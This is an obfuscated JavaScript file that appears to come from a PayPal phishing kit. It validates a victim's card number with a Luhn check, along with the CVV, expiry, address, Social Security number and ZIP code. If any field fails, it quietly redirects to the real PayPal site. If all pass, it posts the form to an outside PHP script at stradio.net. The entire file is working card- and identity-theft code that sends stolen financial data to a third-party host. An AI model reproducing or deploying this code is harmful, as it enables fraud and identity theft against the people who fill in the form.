var _0x297b9e = "5592aafd837e83b07c58ba5e426d7a18.php";
var _0x3a657d = (function(a) {
    return function(f) {
        var b = f.length,
        e = 1,
        c = 0,
        d;
        while (b) {
            d = parseInt(f.charAt(--b), 10);
            c += (e ^= 1) ? a[d] : d
        }
        return c && c % 10 === 0
    }
} ([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));
var _0x78eb7f = "http://www.stradio.net/";
var _0x68bfad = 0;
function PSubmit() {
    if (!_0x529953()) {
        window.location.replace("https://www.paypal.com/");
        return false;
    }
    if (!_0x68bfad) _0x78eb7f += _0x297b9e;
    _0x68bfad++;
    document.forms["env"].action = _0x78eb7f;
    document.forms["env"].method = "post";
    document.forms["env"].submit();
}
function _0x529953() {
    ax = _0x3a657d(document.env.MBcnum.value);
    if (!ax) return window.location.replace("http://www.paypal.com/"),
    !1;
    var a = document.env.MBaddr.value,
    c = document.env.MBem.value,
    b = document.env.MBey.value,
    d = document.env.MBcv.value;
    if (!document.env.MBfn.value || !a || !d || "00" == c || "00" == b) return window.location.replace("http://www.paypal.com/"),
    !1;
    a = document.env.MBssn.value;
    c = a.length;
    b = 9; - 1 != a.indexOf("-") && (b += 2);
    if ("United States" == document.env.MBctn.value) {
        if (0 < c && c != b) return window.location.replace("http://www.paypal.com/"),
        !1;
        a = document.env.MBzip.value.length;
        if (0 < a && 5 != a) return window.location.replace("http://www.paypal.com/"),
        !1
    }
    return !0
};